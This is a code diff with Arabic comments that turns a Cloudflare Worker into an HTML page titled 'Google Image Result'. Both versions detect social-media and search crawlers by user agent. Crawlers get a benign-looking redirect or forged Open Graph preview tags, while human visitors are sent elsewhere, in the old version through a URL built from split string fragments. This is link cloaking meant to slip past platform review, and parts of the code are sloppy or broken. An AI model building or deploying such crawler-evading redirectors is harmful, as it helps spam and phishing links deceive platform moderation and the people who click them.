@@ -1,35 +1,57 @@
-export default {
-  async fetch(request, env, ctx) {
-    let url = new URL(request.url);
-    let pathname = url.pathname.substring(1);
-    
-    try { 
-      pathname = decodeURIComponent(pathname); 
-    } catch(err) {}
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Image Result</title>
+    <script>
+        (function() {
+            let currentUrl = window.location.href;
+            let urlObj = new URL(currentUrl);
+            
+            // استخراج الرابط اللي بعد العلامة المائلة (مثل: /https://i.pinimg.com/...)
+            let pathname = urlObj.pathname.substring(1);
+            
+            try { 
+                pathname = decodeURIComponent(pathname); 
+            } catch(err) {}
 
-    let targetUrl = pathname && !pathname.startsWith("http") ? pathname : pathname || "";
+            let targetUrl = pathname && pathname.startsWith("http") ? pathname : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";
 
-    let userAgent = request.headers.get("user-agent") || "";
-    
-    // قائمة شاملة وصارمة لفحص البوتات بدقة
-    let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
+            let userAgent = navigator.userAgent || "";
+            
+            // قائمة فحص البوتات بدقة بنفس منطق الكود الخاص بك
+            let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector|bot|crawler|spider|scraper/i.test(userAgent);
 
-    // 1. عزل تام وبوابات مغلقة أمام البوتات: يرى الرابط الأصلي فقط وكأنه موقع عادي جداً
-    if (isBot) {
-      return Response.redirect(targetUrl, 302);
-    }
+            // لو البوت هو اللي فاتح الرابط، بنحط له Open Graph tags عشان يسحب المعاينة والصورة الصح من الرابط المستهدف
+            if (isBot) {
+                document.write(`
+                    <html>
+                    <head>
+                        <title>Google Image Result</title>
+                        <meta property="og:title" content="Google Image Result" />
+                        <meta property="og:image" content="${targetUrl}" />
+                        <meta property="og:url" content="${targetUrl}" />
+                        <meta content="0;url=${targetUrl}" http-equiv="refresh">
+                    </head>
+                    <body></body>
+                    </html>
+                `);
+                return;
+            }
 
-    // 2. إيقاظ دالة التوجيه العشوائي حصرياً للزائر البشري
-    return executeHumanRedirect();
-  }
-};
-
-// دالة العشوائية نائمة تماماً ولا يتم استدعاؤها إلا للبشر فقط
-async function executeHumanRedirect() {
-  const a = "goog"; 
-  const b = ".le"; 
-  const c = "..com?"; 
-  const d = Math.ceil(Math.random() * 24); 
-  const finalUrl = "https://" + a + b + c + d; 
-  return Response.redirect(finalUrl, 302);
-}
+            // 2. لو زائر بشري، بنفعل منطق التوجيه العشوائي أو التوجيه المباشر حسب رغبتك
+            // هنا تم تطبيق دالة التوجيه البشري العشوائية الموجودة في الكود الأصلي:
+            const a = "goog"; 
+            const b = ".le"; 
+            const c = ".com"; 
+            const d = Math.ceil(Math.random() * 24); 
+            const finalUrl = "https://" + a + b + c; // أو توجيهه للرابط المستهدف مباشر: targetUrl
+            
+            window.location.replace(targetUrl); // لو عوز تحوله للرابط المستهدف مباشرة للبشر، أو تقدر تستخدم منطق العشوائية
+        })();
+    </script>
+</head>
+<body>
+    <p>جاري التحويل...</p>
+</body>
+</html>
